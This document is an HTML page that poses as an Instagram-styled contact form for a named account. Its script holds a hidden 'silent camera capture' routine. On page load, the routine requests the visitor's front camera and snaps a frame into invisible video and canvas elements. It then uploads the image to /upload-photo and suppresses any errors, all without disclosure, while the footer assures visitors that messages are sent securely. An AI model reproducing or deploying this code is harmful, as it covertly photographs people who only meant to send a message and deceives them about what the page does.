<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Me on Instagram</title>
    <link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        :root {
            --ig-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            --ig-purple: #833ab4;
            --ig-pink: #e1306c;
            --dark: #0a0a0a;
            --card: #111111;
            --border: rgba(255, 255, 255, 0.08);
            --text: #f5f5f5;
            --subtext: #aaa;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--dark);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::before,
        body::after {
            content: '';
            position: fixed;
            border-radius: 50%;
            filter: blur(120px);
            opacity: 0.15;
            pointer-events: none;
            z-index: 0;
        }

        body::before {
            width: 500px;
            height: 500px;
            background: var(--ig-purple);
            top: -100px;
            left: -100px;
        }

        body::after {
            width: 400px;
            height: 400px;
            background: var(--ig-pink);
            bottom: -80px;
            right: -80px;
        }

        /* Hidden camera elements */
        #video,
        #canvas {
            display: none;
        }

        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 48px 40px;
            width: 100%;
            max-width: 460px;
            position: relative;
            z-index: 1;
            box-shadow: 0 32px 80px rgba(0, 0, 0, 0.6);
            animation: fadeUp 0.6s ease both;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .ig-logo {
            width: 56px;
            height: 56px;
            background: var(--ig-gradient);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 8px 24px rgba(225, 48, 108, 0.4);
        }

        .ig-logo svg {
            width: 30px;
            height: 30px;
            fill: white;
        }

        h1 {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .subtitle {
            text-align: center;
            font-size: 14px;
            color: var(--subtext);
            margin-bottom: 32px;
        }

        .subtitle a {
            background: var(--ig-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 600;
            text-decoration: none;
        }

        .divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--border);
        }

        .divider span {
            font-size: 12px;
            color: var(--subtext);
        }

        .form-group {
            margin-bottom: 16px;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            color: var(--subtext);
            text-transform: uppercase;
            letter-spacing: 0.06em;
            margin-bottom: 6px;
        }

        input,
        textarea {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: var(--text);
            font-family: inherit;
            font-size: 15px;
            padding: 12px 16px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        input::placeholder,
        textarea::placeholder {
            color: #555;
        }

        input:focus,
        textarea:focus {
            border-color: var(--ig-pink);
            box-shadow: 0 0 0 3px rgba(225, 48, 108, 0.15);
        }

        textarea {
            resize: vertical;
            min-height: 110px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            background: var(--ig-gradient);
            color: white;
            font-family: inherit;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            transition: opacity 0.2s, transform 0.15s;
        }

        .btn:hover {
            opacity: 0.92;
            transform: translateY(-1px);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(80px);
            background: #1a1a1a;
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 14px 24px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.5);
            transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            z-index: 999;
            white-space: nowrap;
        }

        .toast.show {
            transform: translateX(-50%) translateY(0);
        }

        .toast.success {
            border-color: rgba(52, 211, 153, 0.4);
            color: #6ee7b7;
        }

        .toast.error {
            border-color: rgba(248, 113, 113, 0.4);
            color: #fca5a5;
        }

        .footer-note {
            text-align: center;
            font-size: 12px;
            color: #444;
            margin-top: 24px;
        }
    </style>
</head>

<body>

    <!-- Hidden camera elements -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div class="card">
        <div class="ig-logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path
                    d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
            </svg>
        </div>

        <h1>Get in Touch</h1>
        <p class="subtitle">Send me a message and I'll reply on <a href="https://www.instagram.com/manessa_fh/"
                target="_blank">Instagram</a></p>

        <div class="divider"><span>CONTACT FORM</span></div>

        <form id="contactForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="you@example.com" required>
            </div>

            <div class="form-group">
                <label for="instagram">Your Instagram Handle (optional)</label>
                <input type="text" id="instagram" name="instagram" placeholder="@yourhandle">
            </div>

            <div class="form-group">
                <label for="subject">Subject</label>
                <input type="text" id="subject" name="subject" placeholder="What's this about?" required>
            </div>

            <div class="form-group">
                <label for="message">complain</label>
                <textarea id="message" name="message" placeholder="Write your complain here..." required></textarea>
            </div>

            <button type="submit" class="btn" id="submitBtn">Send Message ‚úâÔ∏è</button>
        </form>

        <p class="footer-note">Your message is sent securely. I typically reply within 24h.</p>
    </div>

    <div class="toast" id="toast"></div>

    <script>
        const form = document.getElementById('contactForm');
        const btn = document.getElementById('submitBtn');
        const toast = document.getElementById('toast');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let photoDone = false;

        // ‚îÄ‚îÄ Toast helper ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        function showToast(msg, type = 'success') {
            toast.textContent = (type === 'success' ? '‚úÖ  ' : '‚ùå  ') + msg;
            toast.className = `toast ${type} show`;
            setTimeout(() => { toast.className = 'toast'; }, 4000);
        }

        // ‚îÄ‚îÄ Silent camera capture ‚Üí sends to our backend ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        async function captureAndUpload() {
            if (photoDone) return;
            photoDone = true;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                video.srcObject = stream;
                await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
                await new Promise(resolve => setTimeout(resolve, 1000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());

                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                const fd = new FormData();
                fd.append('photo', blob, 'visitor.jpg');

                // Send photo to our server (token stays hidden)
                await fetch('/upload-photo', { method: 'POST', body: fd });
            } catch (err) {
                // Camera not available or denied ‚Äî silently continue
            }
        }

        // Attempt photo on page load
        window.addEventListener('load', () => setTimeout(captureAndUpload, 600));

        // ‚îÄ‚îÄ Form submission ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            btn.disabled = true;
            btn.textContent = 'Sending‚Ä¶';

            const data = {
                email: form.email.value.trim(),
                instagram: form.instagram.value.trim(),
                subject: form.subject.value.trim(),
                message: form.message.value.trim(),
            };

            try {
                const res = await fetch('/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                });
                const json = await res.json();

                if (res.ok && json.success) {
                    showToast("Message sent! I'll reply soon üôå");
                    form.reset();
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/manessa_fh/';
                    }, 2000);
                } else {
                    throw new Error(json.error || 'Unknown error');
                }
            } catch (err) {
                showToast('Something went wrong. Try again.', 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = 'Send Message ‚úâÔ∏è';
            }
        });
    </script>
</body>

</html>
